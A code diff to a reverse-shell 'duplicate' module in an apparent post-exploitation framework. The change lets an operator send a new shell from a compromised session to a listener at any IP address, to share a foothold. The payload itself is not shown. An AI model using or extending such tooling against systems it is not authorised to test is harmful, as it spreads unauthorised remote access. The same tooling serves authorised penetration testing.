@@ -1,5 +1,7 @@
 from __future__ import annotations
 
+import ipaddress
+
 from koi.modules.blueprint import KoiModule
 from koi.utils.config import CONFIG, TIMEOUTS
 from koi.utils.payloads import get_interfaces
@@ -16,10 +18,11 @@ class DuplicateModule(KoiModule):
     description = "Create a new reverse shell from this session back to the listener"
     category    = "Session"
     platform    = ["linux", "windows_ps"]
-    usage       = "duplicate <id> [-i IFACE] [-p PORT]"
+    usage       = "duplicate <id> [-i IFACE|IP] [-p PORT]"
     arguments   = [
-        {"flags": ["-i", "--iface"], "default": None, "metavar": "IFACE",
-         "help": "Network interface to use (default: wlan0 with confirmation)"},
+        {"flags": ["-i", "--iface"], "default": None, "metavar": "IFACE|IP",
+         "help": "Interface name, or an IP to call back to directly "
+                 "(share a foothold to another listener). Default: wlan0 with confirmation"},
         {"flags": ["-p", "--port"], "type": int, "default": CONFIG["port"], "metavar": "PORT",
          "help": f"Listener port (default: {CONFIG['port']})"},
     ]
@@ -30,21 +33,36 @@ class DuplicateModule(KoiModule):
         else:
             self._run_windows()
 
+    @staticmethod
+    def _as_ip(value: str) -> str | None:
+        """Return the value if it is a literal IP address, else None."""
+        try:
+            return str(ipaddress.ip_address(value))
+        except ValueError:
+            return None
+
     def _select_interface(self) -> tuple[str, int] | None:
         """Resolve (lhost, lport) from args, prompting for the interface if none
-        was given. Returns None if there are no interfaces or the user cancels."""
+        was given. Returns None if there are no interfaces or the user cancels.
+
+        The -i value may be a literal IP instead of an interface name. That IP is
+        used as-is so the new shell can call back to a listener on another host
+        (sharing a foothold), rather than to one of our own interfaces."""
+        iface_arg = getattr(self.args, "iface", None)
+        port_arg = getattr(self.args, "port", CONFIG["port"])
+
+        if iface_arg and (ip := self._as_ip(iface_arg)) is not None:
+            return ip, port_arg
+
         ifaces = get_interfaces()
 
         if not ifaces:
             self.err("No local network interfaces found. Make sure the 'ip' command is available on this machine.")
             return None
 
-        iface_arg = getattr(self.args, "iface", None)
-        port_arg = getattr(self.args, "port", CONFIG["port"])
-
         if iface_arg:
             if iface_arg not in ifaces:
-                self.err(f"Interface '{iface_arg}' not found. Available: {', '.join(ifaces.keys())}")
+                self.err(f"'{iface_arg}' is not a known interface or a valid IP. Available interfaces: {', '.join(ifaces.keys())}")
                 return None
             iface = iface_arg
         else:
